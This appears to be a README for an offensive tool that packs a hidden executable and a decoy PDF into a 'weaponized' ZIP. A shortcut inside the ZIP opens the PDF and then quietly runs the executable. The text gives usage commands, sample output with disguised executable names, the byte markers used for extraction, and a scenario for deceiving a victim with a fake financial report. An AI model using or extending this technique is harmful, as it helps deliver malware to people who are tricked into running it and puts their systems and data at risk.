# PDF Decoy Feature Demo

The enhanced `zip_smuggle_optimized.py` script now supports embedding a decoy PDF that opens before the executable runs. This makes the attack more convincing by showing legitimate-looking content first.

## How It Works

1. **PDF Embedding**: The PDF is embedded in the ZIP file BEFORE the executable
2. **Automatic Detection**: The PowerShell script searches for the PDF header (`%PDF-`)
3. **Sequential Execution**: 
   - First, the PDF is extracted and opened
   - After a 2-second delay, the executable runs
   - This creates a more believable scenario

## Usage Examples

### Basic Usage (no PDF)
```bash
python zip_smuggle_optimized.py testarch ChromeUpdate.exe 4
```

### With PDF Decoy
```bash
# Format: script <name> <exe> <level> <pdf>
python zip_smuggle_optimized.py report ChromeUpdate.exe 4 decoy.pdf

# Or: script <name> <exe> <pdf> <level>
python zip_smuggle_optimized.py report ChromeUpdate.exe decoy.pdf 4
```

## Creating a Test PDF

Use the provided script to create a test PDF:
```bash
python create_test_pdf.py
```

This creates `test_decoy.pdf` with fake company report content.

## Full Example

```bash
# 1. Create a test PDF
python create_test_pdf.py

# 2. Create the weaponized ZIP with PDF decoy
python zip_smuggle_optimized.py quarterly_report notepad.exe 4 test_decoy.pdf

# Output:
# payloadname: quarterly_report
# file to smuggle: notepad.exe
# Generated output exe name: PrinterSpoolerFix20250610104320.exe
# Obfuscation level: 4
# Decoy PDF: test_decoy.pdf (623 bytes)
# PDF filename: test_decoy.pdf
# ...
# Embedding PDF: test_decoy.pdf (623 bytes)
# Embedding EXE: notepad.exe (193536 bytes)
# ...
# [+] Done. File saved at quarterly_report.zip
# 📄 PDF decoy will open first when the payload is executed
# ✅ Used optimized version - should execute much faster!
```

## Attack Scenario

1. **Victim receives**: `quarterly_report.zip`
2. **Victim opens ZIP**: Sees `quarterly_report.lnk` (looks like a shortcut to a document)
3. **Victim clicks LNK**: 
   - PDF opens showing "Q4 2024 Financial Results"
   - 2 seconds later, malware executes in background
4. **Victim thinks**: They just opened a legitimate report

## Technical Details

### Embedded Data Structure
```
[ZIP Header]
[ZIP Content (LNK file)]
[PDF Data (%PDF-...%%EOF)]     <- First embedded data
[EXE Data (0x55555555 + exe)]  <- Second embedded data
[ZIP Central Directory]
[ZIP End of Central Directory]
```

### PowerShell Extraction Logic
- Searches for `0x50 0x44 0x46 0x2D` (PDF header)
- Extracts exact PDF size bytes
- Searches for `0x55 0x55 0x55 0x55` (EXE marker)
- Extracts EXE after marker

## Security Considerations

- The PDF provides social engineering cover
- Delay allows PDF reader to fully load
- Both files execute from %TEMP%
- Original ZIP appears unmodified

## Performance Note

With obfuscation level 4:
- No recursive file search
- Optimized byte pattern matching
- Executes in 1-2 seconds (vs 30+ seconds)
